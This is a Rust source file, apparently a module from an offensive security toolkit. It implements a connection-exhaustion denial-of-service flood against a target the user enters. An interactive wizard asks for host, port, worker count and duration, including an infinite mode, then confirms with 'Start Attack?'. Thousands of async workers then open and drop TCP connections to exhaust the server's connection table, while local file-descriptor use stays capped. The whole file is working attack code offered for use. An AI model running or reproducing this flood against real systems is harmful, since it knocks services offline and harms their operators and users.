// src/modules/exploits/dos/connection_exhaustion_flood.rs
//
// Ultra-fast connection flood (server-side exhaustion)
// Opens TCP connections in parallel as fast as possible, immediately closes them.
// Uses a semaphore to bound max concurrent FDs so the LOCAL machine never runs out.
// Target: exhaust server's connection table / TIME_WAIT slots

use anyhow::{anyhow, Context, Result};
use colored::*;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::Instant;

use crate::utils::{normalize_target, prompt_default, prompt_port, prompt_required, prompt_yes_no};

/// Maximum concurrent file descriptors to use (local side protection)
const DEFAULT_MAX_FDS: usize = 1000;

/// Configuration for the connection flood
#[derive(Clone, Debug)]
struct FloodConfig {
    target_display: String,
    resolved_addrs: Vec<SocketAddr>,
    max_concurrent_fds: usize,
    worker_count: usize,
    duration_secs: u64,
    connect_timeout_ms: u64,
    verbose: bool,
}

/// Entry point for the module
pub async fn run(initial_target: &str) -> Result<()> {
    print_banner();
    let config = setup_wizard(initial_target).await?;
    execute_flood(&config).await
}

fn print_banner() {
    println!(
        "{}",
        r#"
╔══════════════════════════════════════════════════════════════╗
║   Connection Exhaustion Flood                                ║
║   Ultra-Fast Parallel TCP Connect & Drop                     ║
║   Server-Side Resource Exhaustion                            ║
╠══════════════════════════════════════════════════════════════╣
║   This module BOUNDS local FD usage via semaphore.           ║
║   Your system will NOT run out of file descriptors.          ║
╚══════════════════════════════════════════════════════════════╝
"#
        .red()
        .bold()
    );
}

async fn setup_wizard(initial_target: &str) -> Result<FloodConfig> {
    println!("{}", "=== Configuration ===".blue().bold());

    // Target
    let target_input = if initial_target.trim().is_empty() {
        prompt_required("Target Host/IP")?
    } else {
        println!(
            "{}",
            format!("[*] Using target: {}", initial_target).cyan()
        );
        initial_target.to_string()
    };

    let normalized = normalize_target(&target_input)?;

    // Extract host and port
    let (host, port) = if let Some((h, p)) = normalized.split_once(':') {
        (h.to_string(), p.parse::<u16>().unwrap_or(80))
    } else {
        let p = prompt_port("Target Port", 80)?;
        (normalized, p)
    };

    let target_display = format!("{}:{}", host, port);

    // Pre-resolve DNS
    println!(
        "{}",
        format!("[*] Resolving {}...", target_display).yellow()
    );
    let resolved_addrs: Vec<SocketAddr> = tokio::net::lookup_host(&target_display)
        .await
        .context("Failed to resolve target hostname")?
        .collect();

    if resolved_addrs.is_empty() {
        return Err(anyhow!("Could not resolve target address"));
    }

    println!(
        "{}",
        format!("[+] Resolved to: {:?}", resolved_addrs).green()
    );

    // Max concurrent FDs (local protection)
    let max_fds_input = prompt_default(
        "Max Concurrent FDs (local limit)",
        &DEFAULT_MAX_FDS.to_string(),
    )?;
    let max_concurrent_fds: usize = max_fds_input
        .parse()
        .map_err(|_| anyhow!("Invalid number for max FDs"))?;

    if max_concurrent_fds == 0 {
        return Err(anyhow!("Max FDs must be > 0"));
    }

    // Worker count (async tasks spawning connections)
    let workers_input = prompt_default("Worker Tasks (parallel spawners)", "2000")?;
    let worker_count: usize = workers_input
        .parse()
        .map_err(|_| anyhow!("Invalid number for workers"))?;

    if worker_count == 0 {
        return Err(anyhow!("Worker count must be > 0"));
    }

    // Duration
    let duration_input = prompt_default("Duration (seconds, 0 = infinite)", "60")?;
    let duration_secs: u64 = duration_input
        .parse()
        .map_err(|_| anyhow!("Invalid duration"))?;

    // Connection timeout
    let timeout_input = prompt_default("Connection Timeout (ms)", "2000")?;
    let connect_timeout_ms: u64 = timeout_input
        .parse()
        .map_err(|_| anyhow!("Invalid timeout"))?;

    let verbose = prompt_yes_no("Verbose Output (show sample errors)?", false)?;

    println!("\n{}", "=== Attack Summary ===".bold());
    println!("  Target: {}", target_display.cyan());
    println!("  Resolved IPs: {:?}", resolved_addrs);
    println!("  Max Concurrent FDs: {} (LOCAL PROTECTION)", max_concurrent_fds);
    println!("  Worker Tasks: {}", worker_count);
    println!(
        "  Duration: {}",
        if duration_secs == 0 {
            "INFINITE (Ctrl+C to stop)".to_string()
        } else {
            format!("{}s", duration_secs)
        }
    );
    println!("  Mode: Connect & Immediate Drop (FD-Bounded)");
    println!();
    println!(
        "{}",
        "[!] Your local FD usage is capped. Target's connection"
            .yellow()
    );
    println!(
        "{}",
        "    table will be exhausted, not yours.".yellow()
    );

    if !prompt_yes_no("Start Attack?", true)? {
        return Err(anyhow!("Attack cancelled by user"));
    }

    Ok(FloodConfig {
        target_display,
        resolved_addrs,
        max_concurrent_fds,
        worker_count,
        duration_secs,
        connect_timeout_ms,
        verbose,
    })
}

async fn execute_flood(config: &FloodConfig) -> Result<()> {
    println!(
        "\n{}",
        "[*] Starting Connection Exhaustion Flood..."
            .yellow()
            .bold()
    );
    println!(
        "{}",
        format!("[*] FD Semaphore limit: {}", config.max_concurrent_fds)
            .dimmed()
    );

    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats_connected = Arc::new(AtomicU64::new(0));
    let stats_failed = Arc::new(AtomicU64::new(0));

    // Semaphore bounds the number of OPEN file descriptors at any time
    let fd_semaphore = Arc::new(Semaphore::new(config.max_concurrent_fds));

    let start_time = Instant::now();
    let connect_timeout = Duration::from_millis(config.connect_timeout_ms);

    // Use first resolved address for raw speed
    let target_addr = config.resolved_addrs[0];

    // Stats printer task
    let s_stop = stop_flag.clone();
    let s_conn = stats_connected.clone();
    let s_fail = stats_failed.clone();
    let s_start = start_time;

    let stats_handle = tokio::spawn(async move {
        let mut last_conn = 0u64;
        loop {
            tokio::time::sleep(Duration::from_secs(1)).await;
            if s_stop.load(Ordering::Relaxed) {
                break;
            }
            let conn = s_conn.load(Ordering::Relaxed);
            let fail = s_fail.load(Ordering::Relaxed);
            let elapsed = s_start.elapsed().as_secs_f64();
            let rate = conn as f64 / elapsed.max(0.001);
            let delta = conn.saturating_sub(last_conn);
            last_conn = conn;

            print!(
                "\r{} {}",
                "[*]".dimmed(),
                format!(
                    "Connected: {} | Failed: {} | Rate: {:.0}/s | Last sec: {} conns   ",
                    conn, fail, rate, delta
                )
                .dimmed()
            );
            use std::io::Write;
            let _ = std::io::stdout().flush();
        }
    });

    // Spawn worker tasks
    // Each worker continuously: acquire semaphore -> connect -> close -> release semaphore
    let mut handles = Vec::with_capacity(config.worker_count);

    for _ in 0..config.worker_count {
        let stop = stop_flag.clone();
        let sem = fd_semaphore.clone();
        let conn_stat = stats_connected.clone();
        let fail_stat = stats_failed.clone();
        let timeout = connect_timeout;
        let verbose = config.verbose;
        let target = target_addr;

        let handle = tokio::spawn(async move {
            let mut rng_counter = 0u64;

            while !stop.load(Ordering::Relaxed) {
                // Acquire semaphore permit BEFORE opening a connection
                // This ensures we never exceed max_concurrent_fds open sockets
                let permit = match sem.acquire().await {
                    Ok(p) => p,
                    Err(_) => break, // Semaphore closed
                };

                // Attempt connection
                match tokio::time::timeout(timeout, TcpStream::connect(target)).await {
                    Ok(Ok(stream)) => {
                        // Successfully connected
                        conn_stat.fetch_add(1, Ordering::Relaxed);
                        // Immediately drop the stream to close the connection
                        // This sends FIN, server still has to handle TIME_WAIT
                        drop(stream);
                    }
                    Ok(Err(e)) => {
                        // Connection error (refused, unreachable, etc.)
                        fail_stat.fetch_add(1, Ordering::Relaxed);
                        if verbose {
                            rng_counter = rng_counter.wrapping_add(1);
                            // Log ~0.1% of errors
                            if rng_counter % 1000 == 0 {
                                eprintln!("\n[!] Connect error: {}", e);
                            }
                        }
                    }
                    Err(_) => {
                        // Timeout
                        fail_stat.fetch_add(1, Ordering::Relaxed);
                    }
                }

                // Drop permit to release the semaphore slot
                // (This happens automatically but being explicit is clearer)
                drop(permit);
            }
        });

        handles.push(handle);
    }

    // Run for duration (or forever if 0)
    if config.duration_secs > 0 {
        tokio::time::sleep(Duration::from_secs(config.duration_secs)).await;
    } else {
        // Infinite mode - wait for Ctrl+C
        println!(
            "\n{}",
            "[*] Running indefinitely. Press Ctrl+C to stop.".yellow()
        );
        // Just keep running until stop_flag is set externally (though in this impl it won't be)
        // In practice the user would Ctrl+C the whole process
        loop {
            tokio::time::sleep(Duration::from_secs(60)).await;
        }
    }

    // Signal stop
    stop_flag.store(true, Ordering::Relaxed);

    println!();
    println!("{}", "[*] Stopping workers...".yellow());

    // Wait for workers to finish their current iteration
    for h in handles {
        let _ = tokio::time::timeout(Duration::from_secs(5), h).await;
    }

    // Stop stats printer
    let _ = stats_handle.await;

    // Final report
    let total_conn = stats_connected.load(Ordering::Relaxed);
    let total_fail = stats_failed.load(Ordering::Relaxed);
    let elapsed = start_time.elapsed().as_secs_f64();

    println!("\n{}", "=== Attack Complete ===".green().bold());
    println!("Target: {}", config.target_display);
    println!("Duration: {:.2}s", elapsed);
    println!("Total Connections: {}", total_conn);
    println!("Failed Attempts: {}", total_fail);

    if elapsed > 0.0 {
        println!("Average Rate: {:.0} conn/s", total_conn as f64 / elapsed);
    }

    println!();
    println!(
        "{}",
        "[+] Local FD usage was bounded to {} concurrent."
            .green()
    );
    println!(
        "{}",
        format!(
            "    Target received {} handshake attempts (server-side exhaustion).",
            total_conn
        )
        .green()
    );

    Ok(())
}
